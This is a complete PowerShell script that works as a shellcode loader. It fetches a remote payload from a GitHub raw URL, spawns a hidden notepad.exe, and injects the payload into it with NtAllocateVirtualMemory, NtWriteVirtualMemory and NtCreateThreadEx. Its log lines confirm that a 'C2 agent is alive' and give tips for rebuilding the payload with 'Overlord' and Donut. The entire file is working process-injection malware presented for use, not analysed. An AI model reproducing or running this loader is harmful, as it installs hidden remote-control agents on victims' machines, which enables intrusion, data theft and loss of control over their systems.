param(
    [string]$Source = "https://github.com/core-session-authkey/verbose-fortnight-lord/raw/refs/heads/main/LORD.sgn",
    [switch]$NoRelaunch
)

$VerbosePreference = "Continue"

function Write-VelaLog { param([string]$Message, [ConsoleColor]$C = "Cyan") Write-Host "[VELA] $Message" -ForegroundColor $C }

if ([Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess -and -not $NoRelaunch) {
    Write-VelaLog "32-bit PowerShell detected. Relaunching 64-bit..." -C Yellow
    $ps64 = Join-Path $env:SystemRoot "System32\WindowsPowerShell\v1.0\powershell.exe"
    $myPath = $MyInvocation.MyCommand.Path
    Start-Process -FilePath $ps64 -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-File","`"$myPath`"","-Source","`"$Source`"","-NoRelaunch") -Wait
    exit $LASTEXITCODE
}

Write-VelaLog "Loading native API..."
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class VelaNative {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessW(IntPtr a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, IntPtr h, ref STARTUPINFO i, out PROCESS_INFORMATION j);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr p, ref IntPtr b, IntPtr z, ref IntPtr s, uint t, uint pr);
    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr p, IntPtr b, byte[] buf, uint n, out uint w);
    [DllImport("ntdll.dll")] public static extern uint NtCreateThreadEx(out IntPtr t, uint a, IntPtr o, IntPtr p, IntPtr s, IntPtr par, bool c, int sz, int mx, int st, IntPtr at);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string r; public string d; public string t;
        public uint x; public uint y; public uint xs; public uint ys;
        public uint xc; public uint yc; public uint fa; public uint fl;
        public short sw; public short cr;
        public IntPtr r2; public IntPtr si; public IntPtr so; public IntPtr se;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hp; public IntPtr ht;
        public int pid; public int tid;
    }
}
"@

function Get-VelaPayload {
    param([string]$Url)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $req = [Net.WebRequest]::Create($Url)
            $req.UserAgent = "Mozilla/5.0"
            $req.Accept = "application/octet-stream"
            $resp = $req.GetResponse()
            if ($resp -ne $null -and [int]$resp.StatusCode -ne 200) {
                Write-VelaLog "HTTP $([int]$resp.StatusCode) on attempt $attempt" -C Yellow
                $resp.Close()
                Start-Sleep -Seconds 2
                continue
            }
            if ($resp.ContentLength -gt 0 -and $resp.ContentLength -lt 4096) {
                Write-VelaLog "WARNING: remote reports only $($resp.ContentLength) bytes; likely an error page / wrong path." -C Yellow
            }
            $ms = New-Object System.IO.MemoryStream
            $resp.GetResponseStream().CopyTo($ms)
            $resp.Close()
            return $ms.ToArray()
        } catch {
            Write-VelaLog "Download attempt $attempt failed: $($_.Exception.Message)" -C Yellow
            Start-Sleep -Seconds 2
        }
    }
    return $null
}

Write-VelaLog "Downloading payload..."
$payload = Get-VelaPayload -Url $Source
if ($null -eq $payload) {
    Write-VelaLog "FATAL: could not download payload from $Source" -C Red
    exit 1
}
$size = $payload.Length
Write-VelaLog "Payload acquired: $size bytes."
if ($size -lt 4096) {
    Write-VelaLog "FATAL: payload too small to be shellcode ($size bytes). Wrong URL / repo moved / error page downloaded." -C Red
    exit 1
}

Write-VelaLog "Spawning hidden host process (notepad.exe)..."
$carrierPath = "C:\Windows\System32\notepad.exe"
$si = New-Object VelaNative+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.fl = 1        # STARTF_USESHOWWINDOW
$si.sw = 0        # SW_HIDE

$pi = New-Object VelaNative+PROCESS_INFORMATION
$ok = [VelaNative]::CreateProcessW([IntPtr]::Zero, $carrierPath, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)
if (-not $ok) {
    $le = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-VelaLog "FATAL: CreateProcessW failed with Win32 error $le" -C Red
    exit 1
}

$targetHandle = $pi.hp
$targetPid = $pi.pid
Write-VelaLog "Host spawned. PID: $targetPid"
Start-Sleep -Milliseconds 1000

$alive = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if (-not $alive) {
    Write-VelaLog "FATAL: Host process died immediately after spawning." -C Red
    exit 1
}

Write-VelaLog "Allocating memory in host..."
$baseAddr = [IntPtr]::Zero
$regionSize = [IntPtr]$size
$status = [VelaNative]::NtAllocateVirtualMemory($targetHandle, [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x40)
if ($status -ne 0) { Write-VelaLog "NtAllocate Failed: 0x$($status.ToString('X8'))" -C Red; exit 1 }

Write-VelaLog "Writing payload to host memory..."
$bytesWritten = [uint32]0
$status = [VelaNative]::NtWriteVirtualMemory($targetHandle, $baseAddr, $payload, [uint32]$size, [ref]$bytesWritten)
if ($status -ne 0 -or $bytesWritten -ne $size) { Write-VelaLog "NtWrite Failed: 0x$($status.ToString('X8')) wrote=$bytesWritten" -C Red; exit 1 }

Write-VelaLog "Creating thread..."
$hThread = [IntPtr]::Zero
$status = [VelaNative]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $targetHandle, $baseAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($status -ne 0) { Write-VelaLog "NtCreateThreadEx Failed: 0x$($status.ToString('X8'))" -C Red; exit 1 }

Write-VelaLog "Thread created. Waiting (10s)..."
$waitStatus = [VelaNative]::WaitForSingleObject($hThread, 10000)

if ($waitStatus -eq 0x102) {
    Write-VelaLog "SUCCESS: Thread still running after 10s. C2 agent is alive." -C Green
} else {
    $exitCode = [uint32]0
    [void][VelaNative]::GetExitCodeThread($hThread, [ref]$exitCode)
    $hexCode = "0x" + $exitCode.ToString("X8")
    Write-VelaLog "FAILED: Thread exited on its own!" -C Red
    Write-VelaLog "Exit Code: $hexCode"
    if ($hexCode -eq "0xC0000005") {
        Write-VelaLog "Reason: Access Violation. Architecture mismatch (x64 shellcode in 32-bit host, or vice versa)." -C Yellow
        Write-VelaLog "This loader launches 64-bit PowerShell automatically. Rebuild shim.sgn as x64 with Overlord and re-check." -C Yellow
    } elseif ($hexCode -eq "0x00000000" -or $hexCode -eq "0xC000013A" -or $hexCode -eq "0xC0000135") {
        Write-VelaLog "Reason: Payload ran and exited. Overlord Exit Mode is wrong." -C Yellow
        Write-VelaLog "Fix: in Overlord set Exit Mode to 'Don't exit' and rebuild the .sgn file." -C Yellow
    } else {
        Write-VelaLog "Reason: Unknown. Check Overlord SGN settings / Donut options." -C Yellow
    }
}

[VelaNative]::CloseHandle($hThread) | Out-Null
